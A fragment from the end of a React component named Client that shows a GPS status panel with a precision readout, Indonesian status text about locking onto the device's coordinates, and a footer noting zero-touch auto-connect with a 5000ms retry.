                PREC: {gpsState.accuracy !== null ? `±${gpsState.accuracy}m` : 'N/A'}
              </div>
            </div>
          ) : (
            <div className="pt-1 text-neutral-500 text-[11px]">
              Mengunci koordinat satelit GPS perangkat...
            </div>
          )}
        </div>
      </div>

      <div className="border-t border-neutral-900 pt-3 flex items-center justify-between text-[11px] text-neutral-600">
        <div className="flex items-center gap-1.5">
          <ShieldAlert className="w-3.5 h-3.5 text-neutral-600" />
          <span>ZERO-TOUCH AUTO-CONNECT · TIDAK MEMERLUKAN INTERAKSI KLIK/TAP</span>
        </div>
        <span>RETRY: 5000ms</span>
      </div>
    </div>
  );
};

export default Client;
